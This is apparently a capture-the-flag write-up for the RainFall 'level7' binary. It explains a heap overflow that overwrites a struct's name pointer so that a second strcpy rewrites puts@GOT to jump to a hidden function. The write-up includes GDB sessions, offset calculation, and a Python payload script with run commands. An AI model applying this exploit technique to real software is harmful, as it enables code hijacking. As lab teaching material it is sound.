## Phase 1: Reconnaissance

We find a binary `level7` in our home folder

---

## Phase 2: Static Analysis

Analyzing the binary with Ghidra we see:

```c
    struct Node
    {
        int id;
        char *name;
    };

    // Allocate first node
    node_a = malloc(sizeof(struct Node)); // malloc(8)
    node_a->id = 1;
    node_a->name = malloc(8);

    // Allocate second node
    node_b = malloc(sizeof(struct Node)); // malloc(8)
    node_b->id = 2;
    node_b->name = malloc(8);

    strcpy(node_a->name, argv[1]);
    strcpy(node_b->name, argv[2]);
```

We also notice this function that never gets called:
```c
void m(void *p1, int p2, char *p3, int p4, int p5)
{
    time_t now;
    now = time(NULL);
    printf("%s - %ld\n", password_buffer, now);
}
```

So in memory, this is what it looks like:

    [ NodeA struct ][ A.name (8) ][ NodeB struct ][ B.name (8) ]

The vulnerability is here:

    strcpy(node_a->name, argv[1]);
    strcpy(node_b->name, argv[2]);

Because `node_a->name` is only 8 bytes, `argv[1]` can overflow into the next heap object

---

## Phase 3: Understanding The Goal

This is another heap buffer overflow, but a bit more complex compared to the last one because it takes **two arguments**

So the goal is to redirect execution into the `m()` function

The simplest way is a GOT overwrite:
- Find a function called later (like `puts()` from our source code)
- Overwrite `puts@GOT` with the address of `m()`
- The next time `puts()` is called, it will jump into `m()` instead

---

## Phase 4: Finding the Important Addresses

Using objdump, we find `puts()` GOT entry:

    objdump -R ./level7
    08049928 R_386_JUMP_SLOT   puts

Then we find the address of `m()`:

    objdump -d ./level7 | grep " <m>:"
    080484f4 <m>:

So we have:
- `08049928` for `puts()`
- `080484f4` for `m()`
  
---

## Phase 5: The Plan

Both structs contain a pointer: `char *name`

So we can:
1. Overflow `node_a->name` until we overwrite the pointer `node_b->name`
2. We will change that `node_b->name` pointer to point to the `puts()` in the GOT (`08049928`)
3. Now, when the program executes the second strcpy call, `strcpy(node_b->name, argv[2])`, it will write `argv[2]` into the GOT entry of `puts()`
5. So if `argv[2]` contains the address of `m()`, then `puts()` -> `m()`

---

## Phase 6: Finding the Padding

We need the number of bytes required to reach `node_b->name` from the start of `node_a->name`

Using GDB, we break before the `strcpy()` happens:
```bash
(gdb) set disassembly-flavor intel
(gdb) break *0x08048581
Breakpoint 1 at 0x8048581
(gdb) run AAAA BBBB
```

We inspect the stack to retrieve heap pointers:
```bash
    x/x $esp+0x1c
    0xbffff6ec:  0x0804a008

    x/x $esp+0x18
    0xbffff6e8:  0x0804a028
```

So:
- `node_A` struct starts at `0x0804a008`
- `node_B` struct starts at `0x0804a028`

Now we dump the `node_A struct` to get the real pointer `node_a->name`:
```bash
    x/2wx 0x0804a008
    0x804a008:  0x00000001  0x0804a018
```
So:

    node_a->name = 0x0804a018

We want to overwrite `node_b->name`, which is located at:

    node_B starts at 0x0804a028
    node_b->name is at 0x0804a02c

So padding is:

    0x0804a02c - 0x0804a018 = 0x14 = 20 bytes

So we need 20 bytes to reach `node_b->name`

---

## Phase 7: Crafting the Exploit

We build two arguments:

- `argv[1]` will overflow from `node_a->name` into `node_b->name`
- `argv[2]` will contain `m()` address

We want:
- node_b->name = puts@GOT
- argv[2]      = m()

Exploit script:
```python
#!/usr/bin/env python2
import os


puts_addr = '\x28\x99\x04\x08'; # puts() - 08049928
m_addr = '\xf4\x84\x04\x08';    # m() - 080484f4

padding = 'A' * 20;

arg1_payload = padding + puts_addr;
arg2_payload = m_addr;

with open('/tmp/arg1', 'wb') as f:
    f.write(arg1_payload)
    
with open('/tmp/arg2', 'wb') as f:
    f.write(arg2_payload)

print("Saved to /tmp/arg1")
print("Saved to /tmp/arg2")
```

---

## Phase 8: Exploit

```bash
level7@RainFall:~$ vim /tmp/exploit.py

level7@RainFall:~$ python /tmp/exploit.py
Saved to /tmp/arg1
Saved to /tmp/arg2
```

Then execute the binary with both arguments:
```bash
./level7 "$(cat /tmp/arg1)" "$(cat /tmp/arg2)"
```

This overwrites `puts@GOT` to point to `m()`

When the program calls `puts()`, it jumps into `m()` and prints the password



